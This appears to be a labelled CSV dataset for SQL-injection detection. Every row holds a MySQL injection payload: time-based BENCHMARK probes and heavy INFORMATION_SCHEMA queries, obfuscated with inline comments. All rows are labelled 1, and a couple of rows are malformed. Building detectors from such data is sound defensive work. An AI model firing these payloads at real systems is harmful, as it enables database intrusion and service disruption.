input_text,Label,classification, ,,,,,,
"+(SELECT/**/VVrq/**/WHERE/**/6566=6566/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"||(SELECT/**/0x54676978/**/WHERE/**/8059=8059/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"||(SELECT/**/0x524e564d/**/FROM/**/DUAL/**/WHERE/**/8412=8412/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"'+(SELECT/**/0x6a69704c/**/WHERE/**/6865=6865/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"'||(SELECT/**/0x50775671/**/FROM/**/DUAL/**/WHERE/**/6425=6425/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"'||(SELECT/**/0x4f495869/**/WHERE/**/3537=3537/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"/**/WHERE/**/6332=6332/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"""/**/WHERE/**/7888=7888/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"'/**/WHERE/**/5860=5860/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
")/**/WHERE/**/1303=1303/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
""")/**/WHERE/**/8961=8961/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"')/**/WHERE/**/9879=9879/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
""")))/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"""))/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
""")/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"%'/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"')))/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"'))/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
")))/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"))/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"""/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"'/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes.,,,,,,,
"')/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
")/**/AND/**/1711=BENCHMARK(5000000,MD5(0x44507354))#",1,Yes,,,,,,,
"'/**/IN/**/BOOLEAN/**/MODE)/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)#",1,Yes,,,,,,,
"`)/**/WHERE/**/4945=4945/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/QlOY",1,Yes,,,,,,,
"`/**/WHERE/**/1716=1716/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/KTYF",1,Yes,,,,,,,
")/**/AS/**/GBrn/**/WHERE/**/6496=6496/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/HviK",1,Yes,,,,,,,
""")/**/AS/**/XVUx/**/WHERE/**/8481=8481/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/ZPmG",1,Yes,,,,,,,
"')/**/AS/**/UuSg/**/WHERE/**/6623=6623/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/Cekr",1,Yes,,,,,,,
"))/**/AS/**/ITBv/**/WHERE/**/5405=5405/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/Rdjm",1,Yes,,,,,,,
"""))/**/AS/**/RPRl/**/WHERE/**/6775=6775/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/UJOX",1,Yes,,,,,,,
"'))/**/AS/**/SLeT/**/WHERE/**/3287=3287/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/iOQs",1,Yes,,,,,,,
"+(SELECT/**/0x456c4a6f/**/WHERE/**/6510=6510/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))+",1,Yes.,,,,,,,
"+(SELECT/**/NJOg/**/WHERE/**/6423=6423/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))+",1,Yes,,,,,,,
"||(SELECT/**/0x6759496f/**/WHERE/**/1901=1901/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||",1,Yes,,,,,,,
"||(SELECT/**/0x774b6252/**/FROM/**/DUAL/**/WHERE/**/9898=9898/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||",1,Yes,,,,,,,
"'+(SELECT/**/0x6d627161/**/WHERE/**/8891=8891/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))+'",1,Yes,,,,,,,
"'||(SELECT/**/0x4a506559/**/FROM/**/DUAL/**/WHERE/**/1527=1527/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||'",1,Yes,,,,,,,
"'||(SELECT/**/0x4e72644d/**/WHERE/**/4080=4080/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1))||'",1,Yes,,,,,,,
"/**/WHERE/**/4896=4896/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/EEwi",1,Yes,,,,,,,
"""/**/WHERE/**/9676=9676/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/aRuu",1,Yes.,,,,,,,
"'/**/WHERE/**/4785=4785/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/fMyZ",1,Yes.,,,,,,,
")/**/WHERE/**/4766=4766/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/QFWn",1,Yes.,,,,,,,
""")/**/WHERE/**/2187=2187/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/zqac",1,Yes,,,,,,,
')/')/**/WHERE/**/4787=4787/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,"/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/DHIu""",1,,,,,,
"'/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/OR/**/'qLjR'='lJLt",1,Yes,,,,,,,
"/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)#/**/gxHl",1,Yes,,,,,,,
"/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/DyzK",1,Yes,,,,,,,
"""/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/""FNkY""/**/LIKE/**/""FNkY",1,Yes,,,,,,,
""")))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(((""nSaR""/**/LIKE/**/""nSaR",1,Yes,,,,,,,
"""))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((""QAeW""/**/LIKE/**/""QAeW",1,Yes,,,,,,,
""")/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(""VwuG""/**/LIKE/**/""VwuG",1,Yes,,,,,,,
"""/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/""uKIy""=""uKIy",1,Yes,,,,,,,
""")))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(((""AxcS""=""AxcS",1,Yes,,,,,,,
"""))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((""VasQ""=""VasQ",1,Yes,,,,,,,
""")/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(""xEkk""=""xEkk",1,Yes,,,,,,,
"'/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/'HoNz'/**/LIKE/**/'HoNz",1,Yes,,,,,,,
"%'/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/'zUbD%'='zUbD",1,Yes,,,,,,,
"')))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((('pmCX'/**/LIKE/**/'pmCX",1,Yes,,,,,,,
"'))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(('NpWA'/**/LIKE/**/'NpWA",1,Yes,,,,,,,
"')/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/('xODu'/**/LIKE/**/'xODu",1,Yes,,,,,,,
"'/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/'LjEA'='LjEA",1,Yes,,,,,,,
"')))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((('ScNo'='ScNo",1,Yes,,,,,,,
"'))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(('aHro'='aHro",1,Yes,,,,,,,
"')/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/('yOSK'='yOSK",1,Yes,,,,,,,
"/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)",1,Yes,,,,,,,
")))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(((3069=3069",1,Yes,,,,,,,
"))/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/((6645=6645",1,Yes,,,,,,,
")/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)/**/AND/**/(5285=5285",1,Yes,,,,,,,
"""/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/gEis",1,Yes,,,,,,,
"'/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/JshT",1,Yes,,,,,,,
"')/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/biJh",1,Yes.,,,,,,,
")/**/OR/**/1121=(SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/A,/**/INFORMATION_SCHEMA.COLUMNS/**/B,/**/INFORMATION_SCHEMA.COLUMNS/**/C/**/WHERE/**/0/**/XOR/**/1)--/**/aCQp",1,Yes,,,,,,,
"'/**/IN/**/BOOLEAN/**/MODE)/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))#",1,Yes,,,,,,,
"`)/**/WHERE/**/6502=6502/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/KBFv",1,Yes.,,,,,,,
"`/**/WHERE/**/4964=4964/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/FvXU",1,Yes.,,,,,,,
")/**/AS/**/OIrW/**/WHERE/**/5472=5472/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/zaNu",1,Yes,,,,,,,
""")/**/AS/**/EIRd/**/WHERE/**/9024=9024/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/LVYS",1,Yes,,,,,,,
"')/**/AS/**/racR/**/WHERE/**/4191=4191/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/ohJB",1,Yes,,,,,,,
"))/**/AS/**/VaNM/**/WHERE/**/9845=9845/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/ZIKT",1,Yes,,,,,,,
"""))/**/AS/**/xEPP/**/WHERE/**/2235=2235/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/GhGo",1,Yes,,,,,,,
"'))/**/AS/**/DNmh/**/WHERE/**/7612=7612/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/oSfG",1,Yes.,,,,,,,
"+(SELECT/**/0x45795678/**/WHERE/**/1745=1745/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42)))+",1,Yes.,,,,,,,
"+(SELECT/**/iFfh/**/WHERE/**/2452=2452/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42)))+",1,Yes.,,,,,,,
"||(SELECT/**/0x6f757144/**/WHERE/**/7561=7561/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42)))||",1,Yes.,,,,,,,
"||(SELECT/**/0x4d755675/**/FROM/**/DUAL/**/WHERE/**/8767=8767/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42)))||",1,Yes.,,,,,,,
"'+(SELECT/**/0x644f6278/**/WHERE/**/8942=8942/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42)))+'",1,Yes.,,,,,,,
"'||(SELECT/**/0x6f4e744d/**/FROM/**/DUAL/**/WHERE/**/3320=3320/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42)))||'",1,Yes,,,,,,,
"'||(SELECT/**/0x66734e69/**/WHERE/**/2085=2085/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42)))||'",1,Yes,,,,,,,
"/**/WHERE/**/7000=7000/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/iNUl",1,Yes,,,,,,,
"""/**/WHERE/**/2084=2084/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/JbRp",1,Yes.,,,,,,,
"'/**/WHERE/**/9867=9867/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/hdWF",1,Yes.,,,,,,,
")/**/WHERE/**/6760=6760/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/ntjX",1,Yes.,,,,,,,
""")/**/WHERE/**/3599=3599/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/KPhL",1,Yes.,,,,,,,
"')/**/WHERE/**/5215=5215/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/nAMQ","'/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/OR/**/'GdST'='rtKg",1,,,,,,,
"/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))#/**/ZqJI",1,Yes,,,,,,,
"/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/jWks",1,Yes.,,,,,,,
"""/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/""EGzX""/**/LIKE/**/""EGzX",1,Yes.,,,,,,,
""")))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(((""uXoC""/**/LIKE/**/""uXoC",1,Yes.,,,,,,,
"""))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/((""dqMj""/**/LIKE/**/""dqMj",1,Yes,,,,,,,
""")/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(""GSGE""/**/LIKE/**/""GSGE",1,Yes.,,,,,,,
"""/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/""FIZd""=""FIZd",1,Yes.,,,,,,,
""")))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(((""EwTl""=""EwTl",1,Yes.,,,,,,,
"""))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/((""RNMt""=""RNMt",1,Yes.,,,,,,,
""")/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(""WEYK""=""WEYK",1,Yes.,,,,,,,
"'/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/'WhCC'/**/LIKE/**/'WhCC",1,Yes.,,,,,,,
"%'/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/'kThz%'='kThz",1,Yes.,,,,,,,
"')))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/((('qeZW'/**/LIKE/**/'qeZW",1,Yes,,,,,,,
"'))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(('AKcj'/**/LIKE/**/'AKcj",1,Yes.,,,,,,,
"')/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/('uGie'/**/LIKE/**/'uGie",1,Yes,,,,,,,
"'/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/'UIQO'='UIQO",1,Yes,,,,,,,
"')))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/((('bVtQ'='bVtQ",1,Yes,,,,,,,
"'))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(('WSLu'='WSLu",1,Yes.,,,,,,,
"')/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/('xMRJ'='xMRJ",1,Yes,,,,,,,
"/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))",1,Yes.,,,,,,,
")))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(((6600=6600",1,Yes,,,,,,,
"))/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/((2715=2715",1,Yes.,,,,,,,
")/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))/**/AND/**/(7408=7408",1,Yes.,,,,,,,
"""/**/OR/**/8743=BENCHMARK(5000000,MD5(0x6c776a42))--/**/Agre",1,Yes.,,,,,,,
